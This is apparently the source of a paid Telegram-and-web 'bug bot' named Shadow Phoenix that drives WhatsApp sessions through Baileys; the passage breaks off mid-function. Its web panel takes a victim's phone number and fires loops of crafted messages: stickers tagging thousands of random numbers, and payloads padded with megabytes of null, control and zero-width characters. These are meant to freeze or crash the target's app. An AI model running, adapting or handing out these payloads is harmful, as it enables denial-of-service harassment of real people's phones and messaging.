const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  proto,
  prepareWAMessageMedia,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}


function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

/*function saveAkses(data) {
  const normalized = {
    owners: data.owners.map(id => id.toString()),
    akses: data.akses.map(id => id.toString())
  };
  fs.writeFileSync(file, JSON.stringify(normalized, null, 2));
}*/

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
    parse_mode: "Markdown"
  });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Error:", e.message);
    }
  };

  let paired = false;

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<b>[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐕𝐯𝐢𝐩  ]</b>
╭─────────────────────────╸╴
│ Hᴏʟᴀᴀ ʙʀᴏᴏ : ${username}
│ Sᴄʀɪᴘᴛ : Shadow Phoenix
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @DryzxModders
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @MexxModders
│ Vᴇʀsɪᴏɴ : 1.0
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
│ 
│ 
│ 「 Akses Menu 」
│ ᯓ /connect
│ ᯓ /listsender
│ ᯓ /delsender
│ ᯓ /ckey
│ ᯓ /listkey
│ ᯓ /delkey
│ 
│ 「 Owner Menu 」
│ ᯓ /addacces
│ ᯓ /delacces
│ ᯓ /addowner
│ ᯓ /delowner
╰─────────────────────────╸╴
`;

  const keyboard = new InlineKeyboard().url(
    "Group Pt",
    "https://t.me/allbuyersxpt"
  );

  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/z7xdq5.png" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }
  );
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /connect 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("Example : /ckey X4thena,30d /ckey X4thena,30d,puki", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey X4thena");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.launch();
console.log(chalk.red(`
╭─⦏ 𝑿-𝑺𝒊𝒍𝒆𝒏𝒕 𝐆𝐞𝐫𝐚çã𝐨 𝟏 ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : X4thena
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./X-SILENT/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✓ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✓ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("✗ Mode salah", {
        message: "Mode tidak dikenali."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("✗ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        Delayinvisdrayy(target);
      } else if (mode === "ios") {
        Delayinvisdrayy(target);
      } else if (mode === "AndrosDelay") {
        Delayinvisdrayy(target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("✗ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function BulldozerXV2(target, mention) {
  console.log(chalk.red(`DelayHard Send To ${target}`));
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1999 }, () =>
             `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function DelayPayNew(target) {
  try {
    let payMessage = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msgPay = generateWAMessageFromContent(target, payMessage, {});
    await sock.relayMessage(target, msgPay.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: msgPay.key.id,
      participant: { jid: target },
      userJid: target,
    });

    const msgStory = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
              },
              body: {
                text: "hi my name is mexx!!",
                format: "DEFAULT",
              },
            },
          },
        },
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9),
      }
    );

    await sock.relayMessage("status@broadcast", msgStory.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
      statusJidList: [target],
      messageId: msgStory.key.id,
    });

  } catch (err) {}
}

async function BetaHardDelay(sock, target) {
    let biji = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- mexx aree youu okkyy?",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- mexx whyyy??!",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        biji.message,
        {
            messageId: biji.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        biji2.message,
        {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function DelayHardNew(target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- MexxKilled Youu",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- MexxKilled Youu",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function HardKouta(target) {
  try {
    const locationMemex = {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
          hydratedFooterText: "",
          locationMessage: {
            degreesLatitude: -6.2088,
            degreesLongitude: 106.8456,
            name: "",
            address: ""
          },
          hydratedButtons: [
            {
              index: 1,
              urlButton: {
                displayText: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
                url: "https://www.google.com/maps?q=-6.2088,106.8456"
              }
            }
          ]
        }
      }
    };

    const msgLoc = generateWAMessageFromContent(target, locationMemex, {});
    await sock.relayMessage(target, msgLoc.message, { messageId: msgLoc.key.id });

    const images = [
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg"
    ];

    for (const [i, url] of images.entries()) {
      await sock.sendMessage(
        target,
        {
          image: { url },
          caption: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000)
        }
      );
    }

  } catch (err) {
  }
}

//═══════════//═════════⧼⧼FUNGSI DELAY⧽⧽═════════//═══════════//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


//═══════════//═════════⧼⧼FUNGSI REPEAT⧽⧽═════════//═══════════//
async function Delayinvisdrayy(target) {
for (let i = 0; i < 20; i++) {
await HardKouta(target)
await DelayHardNew(target)
await BetaHardDelay(sock, target)
await DelayPayNew(target)
await BulldozerXV2(target, false)
await sleep(1000);
console.log(chalk.green(`[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐒𝐞𝐧𝐝 𝟐𝟎 𝐁𝐮𝐠  ]`));
    }
}

async function Hadowhdelay(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
          XtravsBetaXx(X, false),
          XtravsBetaXxV2(X, false)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Delay Invis
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
